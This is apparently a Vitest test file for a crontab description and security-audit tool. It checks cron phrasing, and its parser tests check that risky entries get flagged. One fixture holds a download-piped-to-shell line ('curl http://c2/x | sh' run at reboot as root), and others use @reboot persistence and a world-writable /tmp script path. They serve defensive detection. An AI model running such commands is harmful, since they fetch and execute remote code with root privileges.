import { describe, expect, it } from "vitest";
import { describeSchedule, parseCrontab } from "./logic";

describe("describeSchedule", () => {
  it("describes a specific time", () => {
    expect(describeSchedule("30 4 * * *").description).toBe("At 04:30");
  });

  it("describes a step schedule", () => {
    expect(describeSchedule("*/5 * * * *").description).toBe("Every 5 minutes");
  });

  it("describes every minute", () => {
    expect(describeSchedule("* * * * *").description).toBe("Every minute");
  });

  it("describes comma-separated minutes without leaking brace syntax", () => {
    const d = describeSchedule("0,30 * * * *").description;
    expect(d).not.toMatch(/[{}]/);
    expect(d).toMatch(/0, 30/);
  });

  it("describes comma-separated hours in English", () => {
    const d = describeSchedule("0 9,17 * * *").description;
    expect(d).not.toMatch(/[{}]/);
    expect(d).toMatch(/9, 17/);
  });

  it("uses a correct ordinal for a stepped hour", () => {
    const d = describeSchedule("0 */2 * * *").description;
    expect(d).toMatch(/2nd/);
    expect(d).not.toMatch(/2th/);
  });

  it("names months and weekdays", () => {
    const d = describeSchedule("0 0 1 1 *").description;
    expect(d).toMatch(/January/);
    expect(describeSchedule("0 9 * * 1").description).toMatch(/Monday/);
  });

  it("accepts month and day names", () => {
    const d = describeSchedule("0 0 * jan mon");
    expect(d.valid).toBe(true);
    expect(d.description).toMatch(/January/);
    expect(d.description).toMatch(/Monday/);
  });

  it("expands macros", () => {
    expect(describeSchedule("@daily").description).toMatch(/00:00/);
    expect(describeSchedule("@reboot").description).toMatch(/boot/);
  });

  it("notes the day-of-month OR day-of-week gotcha", () => {
    expect(describeSchedule("0 0 1 * 1").description).toMatch(/OR day-of-week/);
  });

  it("rejects out-of-range fields", () => {
    expect(describeSchedule("99 0 * * *").valid).toBe(false);
    expect(describeSchedule("0 0 * * 9").valid).toBe(false);
  });
});

describe("parseCrontab", () => {
  it("parses a user crontab job", () => {
    const r = parseCrontab("*/5 * * * * /usr/local/bin/backup.sh", false);
    expect(r.jobs).toHaveLength(1);
    expect(r.jobs[0].command).toBe("/usr/local/bin/backup.sh");
    expect(r.jobs[0].user).toBeUndefined();
  });

  it("parses a system crontab with a user column", () => {
    const r = parseCrontab("0 3 * * * root /opt/nightly.sh", true);
    expect(r.jobs[0].user).toBe("root");
    expect(r.jobs[0].command).toBe("/opt/nightly.sh");
  });

  it("flags a @reboot job as persistence", () => {
    const r = parseCrontab("@reboot /tmp/agent.sh", false);
    expect(r.findings.some((f) => /persistence/.test(f.message))).toBe(true);
  });

  it("flags a world-writable script path as high severity", () => {
    const r = parseCrontab("* * * * * /tmp/agent.sh", false);
    expect(r.findings.some((f) => f.severity === "high" && /world-writable/.test(f.message))).toBe(
      true,
    );
  });

  it("flags a relative or empty PATH entry", () => {
    const r = parseCrontab("PATH=.:/usr/bin\n0 * * * * job", false);
    expect(r.findings.some((f) => f.severity === "high" && /PATH/.test(f.message))).toBe(true);
  });

  it("flags download-piped-to-shell", () => {
    const r = parseCrontab("@reboot root curl http://c2/x | sh", true);
    expect(r.findings.some((f) => f.severity === "high" && /pipes to a shell/.test(f.message))).toBe(
      true,
    );
  });

  it("flags root cron running a /home script", () => {
    const r = parseCrontab("0 3 * * * root /home/deploy/nightly.sh", true);
    expect(r.findings.some((f) => f.severity === "high" && /\/home/.test(f.message))).toBe(true);
  });

  it("captures environment assignments", () => {
    const r = parseCrontab("MAILTO=root\n0 * * * * job", false);
    expect(r.env.some((e) => e.name === "MAILTO" && e.value === "root")).toBe(true);
  });

  it("errors on input with no jobs", () => {
    expect(parseCrontab("hello world", false).error).not.toBe("");
  });
});
